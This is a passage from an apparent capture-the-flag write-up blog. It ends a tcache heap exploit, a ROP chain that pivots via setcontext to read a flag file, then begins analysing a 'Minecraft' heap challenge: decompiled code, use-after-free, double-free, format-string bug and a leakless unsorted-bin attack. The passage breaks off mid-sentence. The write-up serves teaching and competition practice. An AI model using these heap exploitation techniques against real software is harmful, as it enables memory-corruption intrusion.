+</span></span><span style=display:flex><span>push_rax <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x45197</span>
+</span></span><span style=display:flex><span>pop_rax <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x4a550</span>
+</span></span><span style=display:flex><span>xchg_eax_edi <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x2ad2b</span>
+</span></span><span style=display:flex><span>syscall_ret <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x66229</span>
+</span></span><span style=display:flex><span>call_gadget <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x154930</span>
+</span></span><span style=display:flex><span>setcontext_gadget <span style=color:#f92672>=</span> libc<span style=color:#f92672>.</span>address <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x580DD</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>new(<span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>0x50</span>,<span style=color:#e6db74>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>new(<span style=color:#ae81ff>4</span>,<span style=color:#ae81ff>0x50</span>,<span style=color:#e6db74>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>new(<span style=color:#ae81ff>5</span>,<span style=color:#ae81ff>0x50</span>,<span style=color:#e6db74>&#39;a&#39;</span>)
+</span></span><span style=display:flex><span>delete(<span style=color:#ae81ff>5</span>)
+</span></span><span style=display:flex><span>new(<span style=color:#ae81ff>6</span>,<span style=color:#ae81ff>0x290</span><span style=color:#f92672>-</span><span style=color:#ae81ff>8</span>,p64(<span style=color:#ae81ff>1</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>)<span style=color:#f92672>*</span><span style=color:#ae81ff>15</span> <span style=color:#f92672>+</span> p64(libc<span style=color:#f92672>.</span>sym[<span style=color:#e6db74>&#39;__free_hook&#39;</span>]))
+</span></span><span style=display:flex><span>new(<span style=color:#ae81ff>7</span>,<span style=color:#ae81ff>0x10</span>,p64(call_gadget))
+</span></span><span style=display:flex><span>base <span style=color:#f92672>=</span> heap_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x2390</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span>                  <span style=color:#75715e># &lt;-- [rdi] &lt;-- payload_base</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(base)              <span style=color:#75715e># &lt;-- [rdi + 8] = rdx</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;B&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x10</span>              <span style=color:#75715e># padding</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(setcontext_gadget) <span style=color:#75715e># &lt;-- [rdx + 0x20]</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)                 <span style=color:#75715e># &lt;-- [rdx + 0x28] = r8</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)                 <span style=color:#75715e># &lt;-- [rdx + 0x30] = r9</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>0x10</span>              <span style=color:#75715e># padding</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)                 <span style=color:#75715e># &lt;-- [rdx + 0x48] = r12</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)                 <span style=color:#75715e># &lt;-- [rdx + 0x50] = r13</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)                 <span style=color:#75715e># &lt;-- [rdx + 0x58] = r14</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)                 <span style=color:#75715e># &lt;-- [rdx + 0x60] = r15</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x158</span>)      <span style=color:#75715e># &lt;-- [rdx + 0x68] = rdi (ptr to flag path)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)                 <span style=color:#75715e># &lt;-- [rdx + 0x70] = rsi (flag = O_RDONLY)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)                 <span style=color:#75715e># &lt;-- [rdx + 0x78] = rbp</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)                 <span style=color:#75715e># &lt;-- [rdx + 0x80] = rbx</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)                 <span style=color:#75715e># &lt;-- [rdx + 0x88] = rdx </span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;A&#34;</span><span style=color:#f92672>*</span><span style=color:#ae81ff>8</span>                 <span style=color:#75715e># padding</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)                 <span style=color:#75715e># &lt;-- [rdx + 0x98] = rcx </span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0xb0</span>)      <span style=color:#75715e># &lt;-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(pop_rax)           <span style=color:#75715e># &lt;-- [rdx + 0xa8] = rcx, will be pushed to rsp</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>2</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(syscall_ret) <span style=color:#75715e># sys_open(&#34;/path/to/flag&#34;, O_RDONLY)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(xchg_eax_edi)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(pop_rsi)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(heap_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x15000</span>) <span style=color:#75715e># destination buffer, can be anywhere readable and writable</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(pop_rdx_r12)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x100</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#75715e># nbytes</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(pop_rax)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(syscall_ret) <span style=color:#75715e># sys_read(eax, heap + 0x15000, 0x100)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(pop_rdi)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(pop_rsi)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(heap_base <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x15000</span>) <span style=color:#75715e># buffer</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(pop_rdx_r12)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>0x100</span>) <span style=color:#f92672>+</span> p64(<span style=color:#ae81ff>0</span>) <span style=color:#75715e># nbytes</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(pop_rax)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(<span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> p64(syscall_ret) <span style=color:#75715e># sys_write(1, heap + 0x15000, 0x100)</span>
+</span></span><span style=display:flex><span>payload <span style=color:#f92672>+=</span> <span style=color:#e6db74>&#34;flag.txt&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>new(<span style=color:#ae81ff>8</span>,len(payload) <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x10</span>,payload)
+</span></span><span style=display:flex><span>delete(<span style=color:#ae81ff>8</span>)
+</span></span><span style=display:flex><span>r<span style=color:#f92672>.</span>interactive()
+</span></span></code></pre></div><h3 id=lfyg-conclusion-lfyg><lf><yg>Conclusion</lf></yg></h3><p>It was a very nice introduction to tcache heap exploitation, a very compact and simple binary, and a very subtle bug leading to the discovery of a powerful primitive. Even if you are a beginner, I believe you can still solve this challenge<br>(except for the last seccomp part)</p><h2 id=lfyg-minecraft-6-solves-lfyg><lf><yg>Minecraft (6 solves)</lf></yg></h2><p>This was a difficult heap challenge, however I solved it in an unintended way, which might be easier than the official solution.<br><img src=/images/minecraft/checksec.png alt=checksec><br>The binary was running with GLIBC-2.27</p><h3 id=lfyg-decompile-and-hopelessly-look-for-a-plan-lfyg><lf><yg>Decompile and hopelessly look for a plan</lf></yg></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__cdecl</span> __noreturn <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> i; <span style=color:#75715e>// ebx
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> choice; <span style=color:#75715e>// [rsp+3h] [rbp-1Dh] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> idx; <span style=color:#75715e>// [rsp+4h] [rbp-1Ch] BYREF
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>__int64</span> v6; <span style=color:#75715e>// [rsp+8h] [rbp-18h]
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
+</span></span><span style=display:flex><span>  v6 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__readfsqword</span>(<span style=color:#ae81ff>0x28u</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>system</span>(<span style=color:#e6db74>&#34;clear&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stdout, <span style=color:#ae81ff>0LL</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0LL</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>setvbuf</span>(stdin, <span style=color:#ae81ff>0LL</span>, <span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>0LL</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;It&#39;s Minecraft time! Your speedrun starts... now!&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>do</span>
+</span></span><span style=display:flex><span>  {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> ( <span style=color:#ae81ff>1</span> )
+</span></span><span style=display:flex><span>    {
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>while</span> ( <span style=color:#ae81ff>1</span> )
+</span></span><span style=display:flex><span>      {
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>while</span> ( <span style=color:#ae81ff>1</span> )
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;(p)lace a block&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;(b)reak a block&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;(r)eplace a block&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;(l)eak the end poem&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%c%*c&#34;</span>, <span style=color:#f92672>&amp;</span>choice);
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> ( choice <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;p&#39;</span> )
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;idx: &#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d%*c&#34;</span>, <span style=color:#f92672>&amp;</span>idx);
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> ( idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>16</span> )
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;len: &#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%ld%*c&#34;</span>, <span style=color:#f92672>&amp;</span>sizes[idx]);
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> ( sizes[idx] <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>1279</span> <span style=color:#f92672>||</span> sizes[idx] <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0x10000</span> )
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>          i <span style=color:#f92672>=</span> idx;
+</span></span><span style=display:flex><span>          <span style=color:#f92672>*</span>((_QWORD <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> i) <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(sizes[idx]);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;type of block: &#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>if</span> ( idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>16</span> )
+</span></span><span style=display:flex><span>            <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, <span style=color:#f92672>*</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx), sizes[idx]);
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( choice <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;b&#39;</span> )
+</span></span><span style=display:flex><span>          <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;idx: &#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d%*c&#34;</span>, <span style=color:#f92672>&amp;</span>idx);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>16</span> )
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>free</span>(<span style=color:#f92672>*</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx));
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;keep in inventory? &#34;</span>);
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%c%*c&#34;</span>, <span style=color:#f92672>&amp;</span>choice);
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> ( choice <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;y&#39;</span> <span style=color:#f92672>||</span> kept )
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>          <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Inventory full!&#34;</span>);
+</span></span><span style=display:flex><span>          <span style=color:#f92672>*</span>((_QWORD <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0LL</span>;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>        {
+</span></span><span style=display:flex><span>          <span style=color:#f92672>++</span>kept;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>      }
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( choice <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;r&#39;</span> )
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>break</span>;
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Careful... you can replace a block once.&#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( replaced )
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>      <span style=color:#f92672>++</span>replaced;
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;idx: &#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d%*c&#34;</span>, <span style=color:#f92672>&amp;</span>idx);
+</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> ( idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>16</span> )
+</span></span><span style=display:flex><span>        <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;type of block: &#34;</span>);
+</span></span><span style=display:flex><span>      <span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, <span style=color:#f92672>*</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx), sizes[idx]);
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>  }
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> ( choice <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;l&#39;</span> );
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Careful... you can only leak the end poem once.&#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;idx: &#34;</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%d%*c&#34;</span>, <span style=color:#f92672>&amp;</span>idx);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>16</span> )
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>strchr</span>(<span style=color:#f92672>*</span>((<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx), <span style=color:#e6db74>&#39;n&#39;</span>) )
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>strlen</span>(<span style=color:#f92672>*</span>((<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx)) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>9</span> )
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#f92672>*</span>((<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx));
+</span></span><span style=display:flex><span>  <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>} 
+</span></span></code></pre></div><p>This was another very compact and simple binary, so I just simply skimmed through the decompilation.<br>We can only malloc a chunk outside of tcache range:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%ld%*c&#34;</span>, <span style=color:#f92672>&amp;</span>sizes[idx]);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( sizes[idx] <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>1279</span> <span style=color:#f92672>||</span> sizes[idx] <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0x10000</span> )
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span>i <span style=color:#f92672>=</span> idx;
+</span></span><span style=display:flex><span><span style=color:#f92672>*</span>((_QWORD <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> i) <span style=color:#f92672>=</span> <span style=color:#a6e22e>malloc</span>(sizes[idx]);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;type of block: &#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( idx <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>0</span> <span style=color:#f92672>||</span> idx <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>16</span> )
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>read</span>(<span style=color:#ae81ff>0</span>, <span style=color:#f92672>*</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx), sizes[idx]);
+</span></span></code></pre></div><p>Immediately we can already see an obvious bug.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#a6e22e>free</span>(<span style=color:#f92672>*</span>((<span style=color:#66d9ef>void</span> <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx));
+</span></span><span style=display:flex><span><span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;keep in inventory? &#34;</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>__isoc99_scanf</span>(<span style=color:#e6db74>&#34;%c%*c&#34;</span>, <span style=color:#f92672>&amp;</span>choice);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( choice <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#39;y&#39;</span> <span style=color:#f92672>||</span> kept )
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>puts</span>(<span style=color:#e6db74>&#34;Inventory full!&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#f92672>*</span>((_QWORD <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx) <span style=color:#f92672>=</span> <span style=color:#ae81ff>0LL</span>;
+</span></span><span style=display:flex><span>}
+</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
+</span></span><span style=display:flex><span>{
+</span></span><span style=display:flex><span>    <span style=color:#f92672>++</span>kept;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>We have an one-time use-after-free.<br>We have a edit function(replace block), and we also have free function(break block).<br>Thus we can write into freed chunk, and also we can free a chunk twice, the first time we keep the block, the second time we cannot keep it anymore.<br>There is also a printf format string vulnerability:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>strchr</span>(<span style=color:#f92672>*</span>((<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx), <span style=color:#e6db74>&#39;n&#39;</span>) )
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> ( <span style=color:#a6e22e>strlen</span>(<span style=color:#f92672>*</span>((<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx)) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>9</span> )
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span><span style=display:flex><span><span style=color:#a6e22e>printf</span>(<span style=color:#f92672>*</span>((<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>)<span style=color:#f92672>&amp;</span>mem <span style=color:#f92672>+</span> idx));
+</span></span><span style=display:flex><span><span style=color:#a6e22e>_Exit</span>(<span style=color:#ae81ff>0</span>);
+</span></span></code></pre></div><p>However it _exit right after, so we cannot use it to leak, and the n character gets filtered as well, so no write for us. <code>There is actually a way to leak using printf without exiting the binary, its the intended solution. I wont mention the technique here, but leave it for another post</code></p><h3 id=lfygbrainstorming-for-an-idea-yglf><lf><yg>Brainstorming for an idea</yg></lf></h3><p>Lets summarize what we have: a UAF, a double-free, malloc in unsorted bin range, we dont have a leak, we already can call system because there is no PIE. But with those 2 powerful vulnerabilities, maybe we can develop a leakless exploit?<br>The binary use read to get input, thus we can do relative write, with a bit of luck we might not need a leak.<br>Because we can only interact with chunk in unsorted bin range, so maybe first we should perform an unsorted bin attack. Abuse this, we can write large value into global_max_fast (because main_arena address in freed unsorted bin only has a 4 bit randomization that we have to brute-force)<br>Address in unsorted bin:<br><img src=/images/minecraft/unsorted1.png alt=unsorted><br>Address of global_max_fast:<br><img src=/images/minecraft/g_max_fast.png alt=g_max_fast><br>After the unsorted bin attack:<br><img src=/images/minecraft/attack.png alt=attack></p><ul><li>We have leveraged our capability, we can now interact with fastbin chunk.<br>Normally, we can now just perform a fastbin attack near __malloc_hook, but sadly we do not have a leak, and at the same time, we don&rsquo;t have any libc address left on the heap to do partial overwrite.</li><li>We have already used our one-time UAF, and now we have to abuse the double-free vulnerability.<br>To move forward, there is a technique you can use after overwriting large value into global_max_fast.<br><img src=/images/minecraft/fastbin.png alt=fastbin></li><li>There is a fastbin array to 